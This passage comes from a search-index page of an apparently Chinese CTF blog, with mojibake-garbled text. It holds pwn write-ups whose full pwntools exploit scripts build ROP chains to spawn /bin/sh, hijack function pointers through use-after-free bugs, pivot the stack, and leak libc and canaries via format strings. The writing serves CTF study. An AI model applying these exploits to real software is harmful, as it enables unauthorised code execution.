p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000474c00) # add rax, 1 ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040139c) # syscall
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å‘ç°é•¿åº¦è¶…è¿‡äº†0x200ï¼Œè¿˜æœ‰å¤§é‡raxåŠ ä¸€çš„æŒ‡ä»¤ï¼ˆå®é™…ä½œç”¨å°±æ˜¯æŠŠraxç½®ä¸º59ï¼Œå‰é¢å‡ºç°äº†pop raxï¼›retï¼‰ï¼Œåˆå¹¶å¾—åˆ°&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from struct import pack

# Padding goes here
p = b&#39;&#39;

p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
p += b&#39;/bin//sh&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004006e6) # pop rdi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044c156) # pop rdx ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
p += p64(59)
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040139c) # syscall
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;expå¦‚ä¸‹(åˆæ˜¯ä¸‡æ¶çš„ç±»å‹è½¬æ¢æµªè´¹æ—¶é—´äº†ğŸ¤¡)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from ctypes import *
from pwn import *
from struct import pack
io = process(&#39;./p8&#39;)
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;, os=&#39;linux&#39;)
elf = ELF(&#39;./p8&#39;)


# Padding goes here
p = b&#39;&#39;

p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
p += b&#39;/bin//sh&#39;
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000444f00) # xor rax, rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004006e6) # pop rdi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e0) # @ .data
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000004040fe) # pop rsi ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000044c156) # pop rdx ; ret
p += pack(&#39;&amp;lt;Q&#39;, 0x00000000006ba0e8) # @ .data + 8
p += pack(&#39;&amp;lt;Q&#39;, 0x0000000000449b9c) # pop rax ; ret
p += p64(59)
p += pack(&#39;&amp;lt;Q&#39;, 0x000000000040139c) # syscall

pay = b&#39;&#39;
for i in range(len(p)):
        pay += (ord(p[i:i+1]) ^ 0x66).to_bytes(1)
payload = b&#39;a&#39;*0x50 + pay

# ----------å¦‚æœè¦ç›´æ¥å¯¹pä¿®æ”¹éœ€è¦å°†pï¼ˆbyteså¯¹è±¡ï¼‰è½¬æ¢ä¸º bytearrayå¯¹è±¡
#p = bytearray(p)
#for i in range(len(p)):
#	p[i:i+1] = (ord(p[i:i+1]) ^ 0x66).to_bytes(1)
#payload = b&#39;a&#39;*0x50 + p

io.sendafter(b&#39;Password: \n&#39;, payload)
io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå¦‚ä¸‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708317770898.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">P8ï¼ˆROPchainï¼‰</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/girlfriend/"" data-c="
          &lt;p&gt;å’Œhacknoteä¸€æ ·ï¼Œè„šæœ¬å°±æ”¹ä¸ªåé—¨åœ°å€è¿˜æœ‰sizeå°±è¡Œ&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./girlfriend&amp;quot;)
elf = ELF(&amp;quot;./girlfriend&amp;quot;)

def add(size,string):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(str(size))
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(string)
    
def delete(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(str(idx))
    
def printf(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(str(idx))

add(30,&amp;quot;aaaa&amp;quot;)
add(30,&amp;quot;bbbb&amp;quot;)
delete(1)
delete(0)
payload = p64(0x400B9C)
add(16,payload)
printf(1)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç»“æœå¦‚ä¸‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708246141311.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">girlfriendï¼ˆ64ä½UAFï¼‰</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/hacknote/"" data-c="
          &lt;h1 id=&#34;æŸ¥çœ‹ä¿æŠ¤&#34;&gt;æŸ¥çœ‹ä¿æŠ¤&lt;/h1&gt;
&lt;figure data-type=&#34;image&#34; tabindex=&#34;1&#34;&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708238447495.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/figure&gt;
&lt;h1 id=&#34;add_note&#34;&gt;add_note&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708238515279.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ³¨æ„&lt;code&gt;**(&amp;amp;notelist + i) = print_note_content&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;print_note&#34;&gt;print_note&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708238621092.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ³¨æ„&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; if ( result )
    return (**(&amp;amp;notelist + v2))(*(&amp;amp;notelist + v2));
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;å¦‚æœæœ‰å†…å®¹åˆ™ä¼šè°ƒç”¨chunkä¸­çš„print_note_contentå‡½æ•°è¾“å‡ºå†…å®¹ï¼Œæ‰€ä»¥æƒ³åˆ°å°†print_note_contentçš„ä½ç½®æ”¹ä¸ºmagicå‡½æ•°ï¼ˆåé—¨å‡½æ•°ï¼‰&lt;/p&gt;
&lt;h1 id=&#34;delete&#34;&gt;delete&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708240322241.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
freeåæœªç½®NULLï¼Œå­˜åœ¨uafæ¼æ´&lt;/p&gt;
&lt;h2 id=&#34;freeé¡ºåº&#34;&gt;freeé¡ºåº&lt;/h2&gt;
&lt;p&gt;å…ˆcontentånotelist&lt;br&gt;
åˆ›å»ºä¸¤ä¸ªnoteåçš„å †&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;|chunk(notelist0)|&amp;lt;--malloc(8)
|chunk(note0)    |&amp;lt;--malloc(20)
|chunk(notelist1)|&amp;lt;--malloc(8)
|chunk(note1)    |&amp;lt;--malloc(20)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ é™¤note1å’Œ0åå†åˆ›å»ºä¸€ä¸ª8sizeçš„chunkåçš„å †ï¼ˆtcachebinsæ˜¯å…ˆè¿›åå‡ºï¼Œååˆ çš„note0å…ˆç”³è¯·çš„notelist2ï¼Œæ‰€ä»¥notelist2åœ¨ä¸Šé¢ï¼Œnote2åœ¨ä¸‹é¢ï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;|chunk(notelist2)|&amp;lt;--malloc(8)
|chunk(note0)    |&amp;lt;--malloc(20)
|chunk(note2)    |&amp;lt;--malloc(8)          
|chunk(note1)    |&amp;lt;--malloc(20)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æ‰€ä»¥ç¼–è¾‘note2çš„å†…å®¹ä¸ºåé—¨å‡½æ•°ï¼Œä¹‹åè°ƒç”¨printå‡½æ•°å³å¯æ‹¿åˆ°shell&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./hacknote&amp;quot;)
elf = ELF(&amp;quot;./hacknote&amp;quot;)

def add(size,string):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(str(size))
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(string)
    
def delete(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(str(idx))
    
def printf(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;:&amp;quot;)
	p.sendline(str(idx))
	
add(20,&amp;quot;aaaa&amp;quot;)
add(20,&amp;quot;bbbb&amp;quot;)
delete(1)
delete(0)
payload = p32(0x08048945)
add(8,payload)
printf(1)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå¦‚ä¸‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708242660643.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">hacknoteï¼ˆ32ä½UAFï¼‰</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/ezuaf/"" data-c="
          &lt;p&gt;æŸ¥çœ‹ä¿æŠ¤&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708231702664.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æŸ¥çœ‹é¢˜ç›®é€»è¾‘&lt;/p&gt;
&lt;h1 id=&#34;creat&#34;&gt;creat&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708231714973.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
ièµ·å§‹ä¸º0ï¼Œåˆ›å»ºçš„èµ·å§‹é¡µå†…å®¹æ˜¯&amp;quot;giao&amp;quot;å’Œechoï¼ˆputsï¼‰å‡½æ•°çš„åœ°å€&lt;/p&gt;
&lt;h1 id=&#34;del&#34;&gt;del&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708231870458.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°å¯ä»¥åˆ é™¤èµ·å§‹é¡µ&lt;/p&gt;
&lt;h1 id=&#34;show&#34;&gt;show&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708231945667.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°å¦‚æœè¦æŸ¥çœ‹èµ·å§‹é¡µåˆ™ä¼š&lt;strong&gt;è°ƒç”¨èµ·å§‹é¡µåœ°å€ä¸­çš„echoå‡½æ•°&lt;/strong&gt;è¾“å‡º&amp;quot;giao&amp;quot;ï¼ˆå®é™…ä¸Šè¿˜æœ‰echoå‡½æ•°çš„åœ°å€ï¼‰&lt;/p&gt;
&lt;h1 id=&#34;edit&#34;&gt;edit&lt;/h1&gt;
&lt;p&gt;&lt;img src=&#34;https://l1u66.github.io//post-images/1708232105575.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å‘ç°æ— æ³•å‘èµ·å§‹é¡µå†™å…¥å†…å®¹ï¼ˆè€Œä¸”å¹¶æ²¡æœ‰æ£€æŸ¥è¾“å…¥çš„æ–‡æœ¬é•¿åº¦ï¼Œå¯èƒ½å‡ºç°æº¢å‡ºï¼‰&lt;/p&gt;
&lt;h1 id=&#34;é¢˜ç›®ç»™å‡ºäº†systemå‡½æ•°&#34;&gt;é¢˜ç›®ç»™å‡ºäº†systemå‡½æ•°&lt;/h1&gt;
&lt;h1 id=&#34;æ”»å‡»æ€è·¯&#34;&gt;æ”»å‡»æ€è·¯ï¼š&lt;/h1&gt;
&lt;p&gt;ç”±äºshowä¼šè°ƒç”¨èµ·å§‹é¡µä¸­çš„å‡½æ•°ï¼Œæ‰€ä»¥å°†echoå‡½æ•°æ”¹ä¸ºsystemå‡½æ•°ï¼Œç„¶åå°†&amp;quot;giao&amp;quot;æ”¹ä¸ºshå³å¯æ‹¿åˆ°shellã€‚&lt;br&gt;
1.creatèµ·å§‹é¡µ&lt;br&gt;
2.delèµ·å§‹é¡µï¼ˆchunkæ”¾å…¥äº†tcachebinsï¼‰&lt;br&gt;
3.creatç¬¬ä¸€é¡µï¼ˆmallocç”³è¯·çš„å†…å­˜å¤§å°éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥ç¬¬ä¸€é¡µæ”¾åœ¨äº†åŸæ¥æ˜¯èµ·å§‹é¡µçš„å†…å­˜ä¸Šï¼‰&lt;br&gt;
4.åœ¨ç¬¬ä¸€é¡µï¼ˆèµ·å§‹é¡µå†…å­˜ï¼‰ä¸Šå†™ä¸‹systemå‡½æ•°åœ°å€ï¼Œå’Œshå­—ç¬¦ä¸²&lt;br&gt;
5.showèµ·å§‹é¡µï¼Œä¾¿ä¼šè°ƒç”¨èµ·å§‹é¡µåœ°å€ä¸­çš„systemå‡½æ•°å–å¾—shell.&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;i386&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./ezuaf&amp;quot;)
elf = ELF(&amp;quot;./ezuaf&amp;quot;)

# creat 0---
def create():
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;1&amp;quot;)

def edit(idx,string):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;2&amp;quot;)
	p.recvuntil(b&amp;quot;\n&amp;quot;)
	p.sendline(str(idx))
	p.recvuntil(b&amp;quot;\n&amp;quot;)
	p.sendline(string)
    
def delete(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;3&amp;quot;)
	p.recvuntil(b&amp;quot;\n&amp;quot;)
	p.sendline(str(idx))
    
def show(idx):
	p.recvuntil(&amp;quot;:&amp;quot;)
	p.sendline(&amp;quot;4&amp;quot;)
	p.recvuntil(b&amp;quot;\n&amp;quot;)
	p.sendline(str(idx))
	
create()
delete(0)
create()
payload = b&#39;sh\x00\x00&#39; + p32(0x08048642)
edit(1, payload)
show(0)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;ç»“æœå¦‚ä¸‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1708234527720.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">ezuaf</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/2024212/"" data-c="
          &lt;h1 id=&#34;erwæ ˆè¿ç§»&#34;&gt;erwï¼ˆæ ˆè¿ç§»ï¼‰&lt;/h1&gt;
&lt;p&gt;æŸ¥çœ‹ä¿æŠ¤&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707883188078.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å†çœ‹é¢˜ç›®é€»è¾‘&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707883121624.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åªæœ‰ä¸€ä¸ªæ ˆæº¢å‡ºï¼Œå‘ç°æ‰“å¼€äº†ç›®æ ‡æ–‡ä»¶ï¼Œæ‰€ä»¥æƒ³åˆ°æ‰“orwï¼Œopenå·²ç»æ‰§è¡Œï¼Œè®¾æ³•æ‰§è¡Œrwï¼Œè¿™é‡Œwæ¢ä¸ºputså‡½æ•°ï¼Œä¼ å‚æ—¶å‘ç°æº¢å‡ºé•¿åº¦ä¸å¤Ÿï¼Œåªæœ‰40ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥è€ƒè™‘æ ˆè¿ç§»ï¼Œç”±äºæ ˆè¿ç§»éœ€è¦è°ƒç”¨readå‡½æ•°åœ¨bssæ®µå†™å…¥ï¼Œç”±äºgadgetsåªæœ‰pop rsi;pop r15;retï¼Œæ‰€ä»¥å‘readå‡½æ•°ä¼ å…¥bssåœ°å€éœ€è¦24ä¸ªå­—èŠ‚ï¼Œåªå‰©ä¸‹16ä¸ªå­—èŠ‚ï¼Œåˆè¦è°ƒæ ˆåˆè¦è°ƒç”¨readå‡½æ•°ï¼Œæ‰€ä»¥æƒ³åˆ°åˆ©ç”¨ç¨‹åºæœ¬èº«ï¼Œreadå‡½æ•°å’Œleaveï¼›retç´§æŒ¨ï¼Œæ‰€ä»¥expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./erw&amp;quot;)
elf = ELF(&amp;quot;./erw&amp;quot;)

rdi = 0x4013c3
rsi_r15 = 0x4013c1
bss = 0x4040C0
read = 0x4010C0
puts = 0x4010A0
leave = 0x401344

#gdb.attach(p)

payload = b&#39;a&#39;*0x40 + p64(bss + 0x60) + p64(rsi_r15) + p64(bss + 0x60) + p64(0) + p64(leave)
p.sendafter(&amp;quot;&amp;gt;&amp;gt; &amp;quot;,payload)

payload = p64(0xdeadbeef) + p64(rdi) + p64(3) + p64(rsi_r15) + p64(bss + 0x200) + p64(0) + p64(read)
payload += p64(rdi) + p64(bss + 0x200) + p64(puts)
p.send(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;æˆåŠŸæ‰“å°å‡ºåˆ›å»ºçš„flag&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707883813024.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;traveleræ ˆè¿ç§»&#34;&gt;travelerï¼ˆæ ˆè¿ç§»ï¼‰&lt;/h1&gt;
&lt;p&gt;æŸ¥çœ‹ä¿æŠ¤ï¼Œå‘ç°å’Œä¸Šä¸€é“é¢˜ä¿æŠ¤ä¸€æ ·&lt;br&gt;
æŸ¥çœ‹é¢˜ç›®é€»è¾‘&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707886063130.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
åªæº¢å‡ºäº†16ä¸ªå­—èŠ‚ï¼Œæ‰€ä»¥æ‰“æ ˆè¿ç§»&lt;br&gt;
å‘ç°åé—¨å‡½æ•°&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707886082474.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æ³¨æ„ï¼š&lt;br&gt;
&lt;strong&gt;echoæŒ‡ä»¤ä¸å¯ä»¥ç›´æ¥æ‰“å°æ–‡ä»¶ã€‚echoæŒ‡ä»¤ç”¨äºåœ¨ç»ˆç«¯ä¸Šæ‰“å°æ–‡æœ¬æˆ–å˜é‡çš„å€¼ï¼Œè€Œä¸æ˜¯æ‰“å°æ–‡ä»¶å†…å®¹ã€‚è¦æ‰“å°æ–‡ä»¶å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨catæŒ‡ä»¤æˆ–è€…å…¶ä»–é€‚å½“çš„å‘½ä»¤ã€‚&lt;/strong&gt; ğŸ¤¡&lt;br&gt;
å‘ç°ç¬¬ä¸€ä¸ªreadå‡½æ•°å†™å…¥çš„ä½ç½®æ˜¯æ ¹æ®rbpçš„ä½ç½®æ¥è®¡ç®—çš„ï¼Œæ‰€ä»¥å°±å¯ä»¥é€šè¿‡æ”¹å˜æ ˆçš„ä½ç½®æ¥æ”¹å˜ç¬¬ä¸€ä¸ªreadå‡½æ•°å†™çš„ä½ç½®ï¼Œä¹Ÿç®—æ˜¯å®ç°äº†ä»»æ„ä½ç½®å†™äº†å§ğŸ˜…&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707892482660.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
å†ä¸€ç‚¹å°±æ˜¯æ ˆè¿ç§»çš„ä½ç½®ï¼Œ0x404000-0x405000éƒ½æ˜¯å¯å†™çš„ï¼Œç»è°ƒè¯•å‘ç°0x404d00å°±å¯ä»¥ä½œä¸ºæ ˆè¿ç§»çš„ä½ç½®ï¼Œå‰é¢çš„åº”è¯¥æ˜¯æœ‰åŠ¨æ€é“¾æ¥çš„å‡½æ•°æˆ–è€…å…¶ä»–é‡è¦çš„ä¸œè¥¿ï¼Œæ‰€ä»¥ä¸èƒ½æ›´æ”¹ï¼Œå¦åˆ™ä¼šEOF&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
context(arch=&amp;quot;amd64&amp;quot;,os=&amp;quot;linux&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./traveler&#39;)
elf = ELF(&#39;./traveler&#39;)


leave = 0x401253
msg = 0x4040A0
bss = 0x404d00
rdi = 0x4012c3
sys = 0x401090
read = 0x4010A0
re_read = 0x401216

#gdb.attach(p)

payload = b&#39;a&#39;*0x20 + p64(bss + 0x20) + p64(re_read)  #rbp = bss + 0x20
p.sendafter(&amp;quot;u?\n&amp;quot;,payload)

payload = b&#39;a&#39;*0x28
p.sendafter(&amp;quot;life?\n&amp;quot;,payload)

payload = p64(rdi) + p64(msg) + p64(sys) + p64(0) + p64(bss - 8) + p64(leave)  #rbp = bss - 8 ; leave -&amp;gt; rsp + 8
p.send(payload)

p.sendafter(&amp;quot;life?\n&amp;quot;,b&#39;/bin/sh\x00&#39;)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå¦‚ä¸‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707892972670.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;wtgret2lib&#34;&gt;wtg(ret2lib)&lt;/h1&gt;
&lt;p&gt;è¿˜æ˜¯æ™®é€šçš„ret2libc......ğŸ™&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&#39;./wtg&#39;)
elf = ELF(&#39;./wtg&#39;)
libc = ELF(&#39;./libc-2.31.so&#39;)

puts_plt = 0x401060
puts_got = 0x404018
main_addr = 0x4011BD
pop_rdi_ret = 0x4012d3
ret = 0x40101a

#gdb.attach(p)

payload = b&#39;a&#39;*128 + p64(0) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
p.sendlineafter(&amp;quot;go?\n&amp;quot;,payload)

puts_addr=u64(p.recvuntil(&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&#39;\x00&#39;))
print(hex(puts_addr))

libc_base = puts_addr - libc.symbols[&#39;puts&#39;]
system_addr = libc_base + libc.symbols[&#39;system&#39;]
bin_addr = libc_base + next(libc.search(b&#39;/bin/sh&#39;))


print(&amp;quot;base = &amp;quot;,hex(libc_base))
print(&amp;quot;sys = &amp;quot;,hex(system_addr))
print(&amp;quot;bin = &amp;quot;,hex(bin_addr))

#gdb.attach(p)

payload = b&#39;b&#39;*128 + p64(0) + p64(ret) + p64(pop_rdi_ret) + p64(bin_addr) + p64(system_addr)
p.sendline(payload)

p.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¿è¡Œç»“æœå¦‚ä¸‹&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707893787554.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
">2024.2.12</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://l1u66.github.io/post/202429/"" data-c="
          &lt;h1 id=&#34;ffä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²ä¸€æ¬¡æ ˆæº¢å‡º&#34;&gt;ff(ä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä¸€æ¬¡æ ˆæº¢å‡º)&lt;/h1&gt;
&lt;p&gt;æŸ¥ä¸‹ä¿æŠ¤ï¼Œä¿æŠ¤å…¨å¼€&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707568409559.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æŸ¥çœ‹ç¨‹åºï¼Œä¸€æ¬¡æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä¸€æ¬¡æ ˆæº¢å‡ºï¼Œæœ‰cannaryå’ŒPIE&lt;br&gt;
&lt;img src=&#34;https://l1u66.github.io//post-images/1707568479742.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æŸ¥çœ‹åç§»ï¼Œç¬¬17ä¸ªå‚æ•°å¯ä»¥æ³„éœ²cannaryï¼Œç¬¬19ä¸ªå‚æ•°å¯ä»¥æ³„éœ²ç¨‹åºå®é™…åœ°å€ï¼Œç¨‹åºä¸­æœ‰åé—¨å‡½æ•°&lt;br&gt;
expå¦‚ä¸‹&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;from pwn import *
from LibcSearcher import *
context(os=&amp;quot;linux&amp;quot;, arch=&amp;quot;amd64&amp;quot;, log_level=&amp;quot;debug&amp;quot;)

p = process(&amp;quot;./ff&amp;quot;)
elf = ELF(&amp;quot;./ff&amp;quot;)

sem = b&amp;quot;name? &amp;quot;
p.sendlineafter(sem,b&amp;quot;%17$p-%19$p&amp;quot;)

p.recvuntil(&amp;quot;0x&amp;quot;)
can = int(p.recv(16),16)
print(&amp;quot;can = &amp;quot;,hex(can))

re = int(p.recv(15)[3:],16)
print(&amp;quot;re = &amp;quot;,hex(re))

